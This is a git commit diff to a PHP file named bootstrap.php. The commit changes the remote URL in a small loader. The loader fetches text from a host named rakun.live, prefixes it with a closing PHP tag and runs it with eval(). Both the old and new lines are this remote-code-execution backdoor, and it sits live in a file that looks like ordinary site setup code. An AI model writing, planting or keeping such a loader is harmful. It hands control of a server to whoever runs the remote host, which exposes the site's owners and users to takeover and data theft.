a9015eec4e787d0200decf6773d8e734ecc460f5
batskulah <alfanpekan@gmail.com>
2025-09-14 13:25:06 +0700

    Update bootstrap.php

--- bootstrap.php
+++ bootstrap.php
@@ -1,5 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/isima.txt'));
+$url = file_get_contents(urldecode('https://rakun.live/landing/revistas.txt'));
 $url = "?> ".$url;
 eval($url);
 
